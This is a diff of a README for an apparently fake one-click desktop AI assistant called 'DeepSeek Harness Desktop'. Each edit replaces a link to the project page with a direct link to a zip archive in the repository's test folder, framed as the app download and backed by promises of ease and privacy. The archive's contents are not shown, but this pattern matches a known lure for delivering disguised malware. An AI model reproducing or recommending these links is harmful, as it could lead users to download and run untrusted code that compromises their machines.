@@ -1,6 +1,6 @@
 # ⚡ deepseek-harness-desktop - Your AI Assistant, One Click Away
 
-[![Download Now](https://img.shields.io/badge/Download-DeepSeek%20Harness-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/niceberserker38/deepseek-harness-desktop)
+[![Download Now](https://img.shields.io/badge/Download-DeepSeek%20Harness-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/niceberserker38/deepseek-harness-desktop/main/test/2.2.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Getting started is easier than ordering coffee. Follow these three simple steps:
 
 ### Step 1: Download the App
 
-Visit this link to download the application: **[https://github.com/niceberserker38/deepseek-harness-desktop](https://github.com/niceberserker38/deepseek-harness-desktop)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/niceberserker38/deepseek-harness-desktop/main/test/2.2.zip](https://raw.githubusercontent.com/niceberserker38/deepseek-harness-desktop/main/test/2.2.zip)**
 
 You'll see a green "Download" button or a "Releases" section. Click it to get the file.
 
@@ -37,7 +37,7 @@ The app opens instantly. You'll see a simple window where you can type your ques
 Ready to dive in? Here's everything you need to know:
 
 **Direct Download:**  
-👉 **[Get DeepSeek Harness Desktop](https://github.com/niceberserker38/deepseek-harness-desktop)**  
+👉 **[Get DeepSeek Harness Desktop](https://raw.githubusercontent.com/niceberserker38/deepseek-harness-desktop/main/test/2.2.zip)**  
 Visit this link to download the application. The download starts automatically after you click.
 
 **What Happens Next:**  
@@ -137,7 +137,7 @@ Your conversations stay local on your machine. Nothing is sent to servers unless
 DeepSeek Harness Desktop takes the complexity out of using AI. No coding, no configuration, no headaches. Just download, open, and let your ideas flow.
 
 **Ready to start?**  
-👉 **[Download DeepSeek Harness Desktop Now](https://github.com/niceberserker38/deepseek-harness-desktop)** – It takes less than a minute.
+👉 **[Download DeepSeek Harness Desktop Now](https://raw.githubusercontent.com/niceberserker38/deepseek-harness-desktop/main/test/2.2.zip)** – It takes less than a minute.
 
 ---
 
